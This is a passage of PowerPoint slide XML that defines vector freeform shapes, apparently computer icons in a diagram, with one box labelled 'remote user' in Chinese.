            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98517" name="Freeform 12"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1380"/>
                <a:ext cx="363" cy="155"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6639 h 129"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 18316 h 129"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 7118 h 129"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 129"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6639 h 129"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 287"/>
                  <a:gd name="T16" fmla="*/ 0 h 129"/>
                  <a:gd name="T17" fmla="*/ 287 w 287"/>
                  <a:gd name="T18" fmla="*/ 129 h 129"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="287" h="129">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98518" name="Freeform 13"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2342" y="1237"/>
                <a:ext cx="241" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101903 w 191"/>
                  <a:gd name="T1" fmla="*/ 16636 h 169"/>
                  <a:gd name="T2" fmla="*/ 12299 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 93122 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 101903 w 191"/>
                  <a:gd name="T9" fmla="*/ 16636 h 169"/>
                  <a:gd name="T10" fmla="*/ 101903 w 191"/>
                  <a:gd name="T11" fmla="*/ 16636 h 169"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 191"/>
                  <a:gd name="T19" fmla="*/ 0 h 169"/>
                  <a:gd name="T20" fmla="*/ 191 w 191"/>
                  <a:gd name="T21" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T12">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T15">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T16">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                  <a:cxn ang="T17">
                    <a:pos x="T10" y="T11"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T18" t="T19" r="T20" b="T21"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="118"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="174" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="118"/>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519" name="Freeform 14"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1379"/>
                <a:ext cx="363" cy="156"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6366 h 130"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 17862 h 130"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 6956 h 130"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 130"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6366 h 130"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 6366 h 130"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 130"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="130">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>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8311" name="Group 15"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2597" y="2502"/>
              <a:ext cx="635" cy="318"/>
              <a:chOff x="2317" y="1111"/>
              <a:chExt cx="755" cy="445"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98500" name="Rectangle 16"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2317" y="1111"/>
                <a:ext cx="755" cy="445"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="00CC99"/>
              </a:solidFill>
              <a:ln w="38100">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" tIns="9144" rIns="27432"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r" eaLnBrk="0" hangingPunct="0"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>远程用户</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98501" name="Freeform 17"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1437"/>
                <a:ext cx="363" cy="114"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 1597 h 95"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 13046 h 95"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2239 h 95"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 446 h 95"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 95"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 1597 h 95"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 95"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="95">
                    <a:moveTo>
                      <a:pt x="287" y="12"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="12"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98502" name="Freeform 18"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1233"/>
                <a:ext cx="230" cy="207"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 468 h 172"/>
                  <a:gd name="T2" fmla="*/ 17619 w 182"/>
                  <a:gd name="T3" fmla="*/ 25518 h 172"/>
                  <a:gd name="T4" fmla="*/ 12976 w 182"/>
                  <a:gd name="T5" fmla="*/ 24724 h 172"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5582 h 172"/>
                  <a:gd name="T8" fmla="*/ 94937 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 172"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 468 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 182"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 182 w 182"/>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182" h="172">
                    <a:moveTo>
                      <a:pt x="182" y="3"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="32" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="3"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98503" name="Freeform 19"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1435"/>
                <a:ext cx="363" cy="116"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 2167 h 96"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 15792 h 96"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2618 h 96"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 684 h 96"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 96"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 2167 h 96"/>
                  <a:gd name="T12" fmla="*/ 163251 w 287"/>
                  <a:gd name="T13" fmla="*/ 2167 h 96"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 287"/>
                  <a:gd name="T22" fmla="*/ 0 h 96"/>
                  <a:gd name="T23" fmla="*/ 287 w 287"/>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7" h="96">
                    <a:moveTo>
                      <a:pt x="287" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="13"/>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504" name="Freeform 20"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1232"/>
                <a:ext cx="230" cy="208"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 549 h 173"/>
                  <a:gd name="T2" fmla="*/ 17111 w 182"/>
                  <a:gd name="T3" fmla="*/ 25059 h 173"/>
                  <a:gd name="T4" fmla="*/ 12334 w 182"/>
                  <a:gd name="T5" fmla="*/ 23995 h 173"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5465 h 173"/>
                  <a:gd name="T8" fmla="*/ 94840 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 173"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 549 h 173"/>
                  <a:gd name="T12" fmla="*/ 101396 w 182"/>
                  <a:gd name="T13" fmla="*/ 549 h 173"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 182"/>
                  <a:gd name="T22" fmla="*/ 0 h 173"/>
                  <a:gd name="T23" fmla="*/ 182 w 182"/>
                  <a:gd name="T24" fmla="*/ 173 h 1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73">
                    <a:moveTo>
                      <a:pt x="182" y="4"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="31" y="173"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="170" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="4"/>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505" name="Freeform 21"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2343" y="1237"/>
                <a:ext cx="242" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 114015 w 191"/>
                  <a:gd name="T1" fmla="*/ 16844 h 169"/>
                  <a:gd name="T2" fmla="*/ 13859 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 103024 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 114015 w 191"/>
                  <a:gd name="T9" fmla="*/ 16844 h 169"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 191"/>
                  <a:gd name="T16" fmla="*/ 0 h 169"/>
                  <a:gd name="T17" fmla="*/ 191 w 191"/>
                  <a:gd name="T18" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98506" name="Freeform 22"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2360" y="1251"/>
                <a:ext cx="208" cy="175"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 85546 w 165"/>
                  <a:gd name="T1" fmla="*/ 16357 h 145"/>
                  <a:gd name="T2" fmla="*/ 10273 w 165"/>
                  <a:gd name="T3" fmla="*/ 23288 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 165"/>
                  <a:gd name="T5" fmla="*/ 5404 h 145"/>
                  <a:gd name="T6" fmla="*/ 77887 w 165"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 85546 w 165"/>
                  <a:gd name="T9" fmla="*/ 16357 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 165"/>
                  <a:gd name="T16" fmla="*/ 0 h 145"/>
                  <a:gd name="T17" fmla="*/ 165 w 165"/>
                  <a:gd name="T18" fmla="*/ 145 h 145"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="165" h="145">
                    <a:moveTo>
                      <a:pt x="165" y="102"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="102"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98507" name="Freeform 23"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1380"/>
                <a:ext cx="363" cy="155"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 6639 h 129"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 18316 h 129"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 7118 h 129"/>
                  <a:gd name="T6" fmla="*/ 95402 w 287"/>
                  <a:gd name="T7" fmla="*/ 0 h 129"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 6639 h 129"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 287"/>
                  <a:gd name="T16" fmla="*/ 0 h 129"/>
                  <a:gd name="T17" fmla="*/ 287 w 287"/>
                  <a:gd name="T18" fmla="*/ 129 h 129"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="287" h="129">
                    <a:moveTo>
                      <a:pt x="287" y="47"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="47"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98508" name="Freeform 24"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2342" y="1237"/>
                <a:ext cx="241" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101903 w 191"/>
                  <a:gd name="T1" fmla="*/ 16636 h 169"/>
                  <a:gd name="T2" fmla="*/ 12299 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
